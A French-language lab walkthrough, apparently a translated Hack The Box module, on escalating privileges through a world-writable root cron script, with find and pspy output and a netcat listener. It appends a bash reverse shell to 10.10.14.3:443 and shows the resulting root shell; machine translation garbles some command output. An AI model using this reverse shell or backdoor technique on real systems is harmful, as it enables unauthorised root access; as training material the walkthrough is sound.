Cron Job Abus
==============

* * * * *

Les tâches cron peuvent également être configurées pour être exécutées une seule fois (par exemple au démarrage). Ils sont généralement utilisés pour des tâches administratives telles que l'exécution de sauvegardes, le nettoyage de répertoires, etc. La commande `crontab` peut créer un fichier cron, qui sera exécuté par le démon cron selon le calendrier spécifié. Une fois créé, le fichier cron sera créé dans `/var/spool/cron` pour l'utilisateur spécifique qui le crée. Chaque entrée du fichier crontab nécessite six éléments dans l'ordre suivant : minutes, heures, jours, mois, semaines, commandes. Par exemple, l'entrée `0 */12 * * * /home/admin/backup.sh` s'exécute toutes les 12 heures.

La crontab root est presque toujours modifiable uniquement par l'utilisateur root ou un utilisateur disposant de tous les privilèges sudo ; cependant, il peut encore être abusé. Vous pouvez trouver un script accessible en écriture par tout le monde qui s'exécute en tant que root et, même si vous ne pouvez pas lire le crontab pour connaître le calendrier exact, vous pourrez peut-être déterminer la fréquence à laquelle il s'exécute (c'est-à-dire un script de sauvegarde qui crée un `.tar. gz` fichier toutes les 12 heures). Dans ce cas, vous pouvez ajouter une commande à la fin du script (comme un shell inversé à une ligne) et elle s'exécutera la prochaine fois que la tâche cron s'exécutera.

Certaines applications créent des fichiers cron dans le répertoire `/etc/cron.d` et peuvent être mal configurées pour permettre à un utilisateur non root de les modifier.

Tout d'abord, examinons le système à la recherche de fichiers ou de répertoires inscriptibles. Le fichier `backup.sh` dans le répertoire `/dmz-backups` est intéressant et semble s'exécuter sur une tâche cron.

```
dsgsec@htb[/htb]$ find / -path /proc -prune -o -type f -perm -o+w 2>/dev/null

/etc/cron.daily/backup
/dmz-backups/backup.sh
/proc
/sys/fs/cgroup/memory/init.scope/cgroup.event_control

<SNIP>
/home/backupsvc/backup.sh

<SNIP>

```

Un coup d'œil rapide dans le répertoire `/dmz/backups` indique ce qui semble être des fichiers créés toutes les trois minutes. Cela semble être une mauvaise configuration majeure. Peut-être que l'administrateur système voulait spécifier toutes les trois heures comme `0 */3 * * *` mais a plutôt écrit `*/3 * * * *`, ce qui indique à la tâche cron de s'exécuter toutes les trois minutes. Le deuxième problème est que le script shell `backup.sh` est accessible en écriture par tous et s'exécute en tant que root.

```
dsgsec@htb[/htb]$ ls -la /dmz-backups/

total 36
drwxrwxrwx 2 racine racine 4096 31 août 02:39.
drwxr-xr-x 24 racine racine 4096 31 août 02:24 ..
-rwxrwxrwx 1 racine racine 230 31 août 02:39 backup.sh
-rw-r--r-- 1 racine racine 3336 31 août 02:24 www-backup-2020831-02:24:01.tgz
-rw-r--r-- 1 racine racine 3336 31 août 02:27 www-backup-2020831-02:27:01.tgz
-rw-r--r-- 1 racine racine 3336 31 août 02:30 www-backup-2020831-02:30:01.tgz
-rw-r--r-- 1 racine racine 3336 31 août 02:33 www-backup-2020831-02:33:01.tgz
-rw-r--r-- 1 racine racine 3336 31 août 02:36 www-backup-2020831-02:36:01.tgz
-rw-r--r-- 1 racine racine 3336 31 août 02:39 www-backup-2020831-02:39:01.tgz

```

Nous pouvons confirmer qu'une tâche cron est en cours d'exécution à l'aide de [pspy](https://github.com/DominicBreuker/pspy), un outil de ligne de commande utilisé pour afficher les processus en cours d'exécution sans avoir besoin de privilèges root. Nous pouvons l'utiliser pour voir les commandes exécutées par d'autres utilisateurs, les tâches cron, etc. Cela fonctionne en analysant [procfs](https://en.wikipedia.org/wiki/Procfs).

Exécutons `pspy` et regardons. L'indicateur `-pf` indique à l'outil d'imprimer les commandes et les événements du système de fichiers et `-i 1000` lui indique d'analyser [profcs](https://man7.org/linux/man-pages/man5/procfs.5. html) toutes les 1 000 ms (ou toutes les secondes).

```
dsgsec@htb[/htb]$ ./pspy64 -pf -i 1000

pspy - version : v1.2.0 - Commit SHA : 9c63e5d6c58f7bcdc235db663f5e3fe1c33b8855

      ██▓███ ██████ ██▓███ ▓██ ██▓
     ▓██░ ██▒▒██ ▒ ▓██░ ██▒▒██ ██▒
     ▓██░ ██▓▒░ ▓██▄ ▓██░ ██▓▒ ▒██ ██░
     ▒██▄█▓▒ ▒ ▒ ██▒▒██▄█▓▒ ▒ ░ ▐██▓░
     ▒██▒ ░ ░▒██████▒▒▒██▒ ░ ░ ░ ██▒▓░
     ▒▓▒░ ░ ░▒ ▒▓▒ ▒ ░▒▓▒░ ░ ░ ██▒▒▒
     ░▒ ░ ░ ░▒ ░ ░░▒ ░ ▓██ ░▒░
     ░░ ░ ░ ░ ░░ ▒ ▒ ░░
                    ░ ░ ░
                                ░ ░

Config : Événements d'impression (colorés=true) : processus=true | file-system-events=true ||| Recherche de processus toutes les 1 s et lors d'événements inotify ||| Répertoires de surveillance : [/usr /tmp /etc /home /var /opt] (récursif) | [] (non récursif)
Vidange des événements du système de fichiers en raison du démarrage...
fait
2020/09/04 20:45:03 CMD : UID=0 PID=999 | /usr/bin/VGAuthService
2020/09/04 20:45:03 CMD : UID=111 PID=990 | /usr/bin/dbus-daemon --system --address=systemd: --nofork --nopidfile --systemd-activation
2020/09/04 20:45:03 CMD : UID=0 PID=99 |
2020/09/04 20:45:03 CMD : UID=0 PID=988 | /usr/lib/snapd/snapd

<SNIP>

2020/09/04 20:45:03 CMD : UID=0 PID=1017 | /usr/sbin/cron -f
2020/09/04 20:45:03 CMD : UID=0 PID=1010 | /usr/sbin/atd -f
2020/09/04 20:45:03 CMD : UID=0 PID=1003 | /usr/lib/accountsservice/accounts-daemon
2020/09/04 20:45:03 CMD : UID=0 PID=1001 | /lib/systemd/systemd-logind
2020/09/04 20:45:03 CMD : UID=0 PID=10 |
2020/09/04 20:45:03 CMD : UID=0 PID=1 | /sbin/init
2020/09/04 20:46:01 FS : OUVERT | /usr/lib/locale/locale-archive
2020/09/04 20:46:01 CMD : UID=0 PID=2201 | /bin/bash/dmz-backups/backup.sh
2020/09/04 20:46:01 CMD : UID=0 PID=2200 | /bin/sh -c /dmz-backups/backup.sh
2020/09/04 20:46:01 FS : OUVERT | /usr/lib/x86_64-linux-gnu/gconv/gconv-modules.cache
2020/09/04 20:46:01 CMD : UID=0 PID=2199 | /usr/sbin/CRON-f
2020/09/04 20:46:01 FS : OUVERT | /usr/lib/locale/locale-archive
2020/09/04 20:46:01 CMD : UID=0 PID=2203 |
2020/09/04 20:46:01 FS : CLOSE_NOWRITE | /usr/lib/locale/locale-archive
2020/09/04 20:46:01 FS : OUVERT | /usr/lib/locale/locale-archive
2020/09/04 20:46:01 FS : CLOSE_NOWRITE | /usr/lib/locale/locale-archive
2020/09/04 20:46:01 CMD : UID=0 PID=2204 | tar --absolute-names --create --gzip --file=/dmz-backups/www-backup-202094-20:46:01.tgz /var/www/html
2020/09/04 20:46:01 FS : OUVERT | /usr/lib/locale/locale-archive
2020/09/04 20:46:01 CMD : UID=0 PID=2205 | gzip
2020/09/04 20:46:03 FS : CLOSE_NOWRITE | /usr/lib/locale/locale-archive
2020/09/04 20:46:03 CMD : UID=0 PID=2206 | /bin/bash /dmz-backups/backup.sh
2020/09/04 20:46:03 FS : CLOSE_NOWRITE | /usr/lib/x86_64-linux-gnu/gconv/gconv-modules.cache
2020/09/04 20:46:03 FS : CLOSE_NOWRITE | /usr/lib/locale/locale-archive

```

À partir de la sortie ci-dessus, nous pouvons voir qu'une tâche cron exécute le script `backup.sh` situé dans le répertoire `/dmz-backups` et crée un fichier tarball du contenu du répertoire `/var/www/html` .

Nous pouvons regarder le script shell et lui ajouter une commande pour tenter d'obtenir un shell inversé en tant que root. Si vous modifiez un script, assurez-vous de `TOUJOURS` faire une copie du script et/ou en créer une sauvegarde. Nous devrions également essayer d'ajouter nos commandes à la fin du script pour continuer à fonctionner correctement avant d'exécuter notre commande reverse shell.

```
dsgsec@htb[/htb]$ cat /dmz-backups/backup.sh

#!/bin/bash
  SRCDIR="/var/www/html"
  DESTDIR="/dmz-sauvegardes/"
  FILENAME=www-backup-$(date +%-Y%-m%-d)-$(date +%-T).tgz
  tar --absolute-names --create --gzip --file=$DESTDIR$FILENAME $SRCDIR

```

Nous pouvons voir que le script prend simplement un répertoire source et destination en tant que variables. Il spécifie ensuite un nom de fichier avec la date et l'heure actuelles de la sauvegarde et crée une archive tar du répertoire source, le répertoire racine Web. Modifions le script pour ajouter un [shell inversé bash à une ligne](http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet).

Code : bash

```
#!/bin/bash
SRCDIR="/var/www/html"
DESTDIR="/dmz-sauvegardes/"
FILENAME=www-backup-$(date +%-Y%-m%-d)-$(date +%-T).tgz
tar --absolute-names --create --gzip --file=$DESTDIR$FILENAME $SRCDIR

bash -i >& /dev/tcp/10.10.14.3/443 0>&1

```

Nous modifions le script, lançons un écouteur `netcat` local et attendons. Effectivement, en trois minutes, nous avons un root shell !

```
dsgsec@htb[/htb]$ nc -lnvp 443

écoute sur [tout] 443 ...
se connecter à [10.10.14.3] depuis (INCONNU) [10.129.2.12] 38882
bash : impossible de définir le groupe de processus de terminal (9143) : ioctl inapproprié pour le périphérique
bash : pas de contrôle des tâches dans ce shell

root@NIX02 :~# identifiant
identifiant
uid=0(racine) gid=0(racine) groupes=0(racine)

root@NIX02 :~# nom d'hôte
nom d'hôte
NIX02

```

`\
`